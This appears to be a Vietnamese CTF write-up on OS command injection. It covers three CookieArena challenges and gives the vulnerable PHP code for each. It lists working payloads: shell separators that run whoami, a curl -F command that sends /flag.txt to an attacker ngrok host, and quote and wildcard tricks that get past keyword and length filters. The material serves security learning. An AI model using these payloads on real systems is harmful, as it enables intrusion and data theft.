# 💣 OS Command Injection

Lỗ hổng OS Command Injection xảy ra khi dữ liệu từ phía người dùng được chèn trực tiếp vào hàm gọi shell (như `system()`, `shell_exec()`, `exec()`,...) mà không được lọc kỹ, cho phép attacker thực thi tùy ý lệnh hệ thống.

---

## 🧪 VD1: Baby Ping - [Link Challenge](https://battle.cookiearena.org/challenges/web/baby-ping)

- URL: `http://example.com/ping?ip=8.8.8.8`
- PHP code:
  ```php
  system("ping -c 1 " . $_GET['ip']);
  ```
- Payloads khai thác:
  ```
  ?ip=google.com;whoami
  ?ip=google.com&whoami
  ?ip=google.com&&whoami
  ?ip=google.com||whoami
  ?ip=google.com|whoami
  ?ip=google.com$(whoami)
  ?ip=google.com`whoami`
  ```
> Lưu ý: nên thử cả dạng URL encode (`%3B`, `%26`, `%7C`, ...)

---

## 🧪 VD2: Baby Crawler - [Link Challenge](https://battle.cookiearena.org/challenges/web/baby-crawler)

- PHP code:
  ```php
  if(isset($_POST['url'])){
      $url = $_POST['url'];
      if(strpos($url, 'http') !== 0 ){
          die('Only HTTP or HTTPS !');
      }else{
          $result = shell_exec('curl '. escapeshellcmd($url));
          ...
      }
  }
  ```
- `escapeshellcmd()` chặn `|`, `;`, `&`,... → không thể inject bằng kỹ tự shell

### 🧠 Ý tưởng bypass:
- Dùng curl gửi file từ server về attacker thông qua `-F`:
  ```bash
  curl -F file=@/flag.txt https://attacker.ngrok.app/
  ```

- Tuy nhiên bị check chuỗi `http` đầu vào → bypass bằng payload:
  ```
  curl http://example.com -F file=@/flag.txt https://your-ngrok-url.ngrok-free.app/
  ```

> 🎯 Gửi về server attacker file flag.txt

---

## 🧪 VD3: Command Length Limit - [Link Challenge](http://battle.cookiearena.org/skills-path/os-command-injection/challenge/command-limit-length)

- Web giới hạn lệnh chỉ được 4 ký tự và chặn các lệnh như `ls`, `cat`, `sh`,...

### 🧠 Ý tưởng bypass:

- Bypass keyword bằng `'`:
  ```bash
  l's'     # thực thi được ls
  ```

- Giới hạn độ dài → dùng trick với wildcard `*`:

  **Bước 1:** tạo file rỗng `cat`
  ```bash
  >cat
  ```

  **Bước 2:** dùng wildcard để kích hoạt lệnh:
  ```bash
  *
  ```

  → Lúc này `*` sẽ match file `cat` và `flag.txt` → shell thực thi `cat flag.txt` tự động

> 🧨 Lợi dụng behavior mặc định của shell để thực thi chuỗi mong muốn mà không cần vượt quá giới hạn độ dài
